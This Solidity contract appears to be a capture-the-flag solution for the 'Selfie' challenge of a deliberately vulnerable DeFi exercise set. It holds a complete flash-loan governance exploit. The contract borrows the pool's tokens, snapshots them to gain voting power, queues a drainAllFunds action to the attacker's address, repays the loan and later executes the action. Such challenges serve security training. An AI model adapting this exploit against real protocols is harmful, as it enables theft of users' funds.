pragma solidity ^0.6.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20Snapshot.sol";

contract AttackSelfie {

    SelfiePool selfie;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot public token;
    address owner;

    uint exploitId;

    constructor(address selfieAddress, address tokenAddress, address governanceAddress) public {
        selfie = SelfiePool(selfieAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
        owner = msg.sender;
    }

    function attack() public {
        token.snapshot();
        selfie.flashLoan(token.getBalanceAtLastSnapshot(address(selfie)));
    }

    function receiveTokens(address _token, uint256 amount) public {
        token.snapshot();
        exploitId = governance.queueAction(address(selfie), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);

        ERC20Snapshot(_token).transfer(msg.sender, amount);
    }

    function exec() public {
        governance.executeAction(exploitId);
    }

}
